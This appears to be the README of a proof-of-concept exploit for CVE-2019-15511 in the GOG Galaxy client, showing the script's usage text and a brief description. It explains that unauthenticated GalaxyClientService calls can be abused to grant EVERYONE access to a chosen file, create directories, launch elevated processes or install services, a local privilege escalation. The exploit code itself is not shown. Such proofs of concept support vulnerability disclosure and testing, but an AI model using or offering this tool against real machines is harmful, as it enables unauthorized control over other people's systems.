# GOG Galaxy Exploit for CVE-2019-15511
```
usage: exploit.py [-h]
                 [--action {LaunchElevatedRequest,FixDirectoryPrivilegesRequest,CreateDirectoryRequest,QueryProcessInfoRequest,InstallServiceRequest,DeleteServiceRequest,MoveAndVerifyGlobalDependencyRequest}]
                 target

positional arguments:
  target

optional arguments:
  -h, --help            show this help message and exit
  --action {LaunchElevatedRequest,FixDirectoryPrivilegesRequest,CreateDirectoryRequest,QueryProcessInfoRequest,InstallServiceRequest,DeleteServiceRequest,MoveAndVerifyGlobalDependencyRequest}
```

It exploits lack of auth when sensitive GalaxyClientService methods are called. Try `FixDirectoryPrivilegesRequest` (grants EVERYONE access to target
file) or `CreateDirectoryRequest` (creates directory in target location) to see it in action.
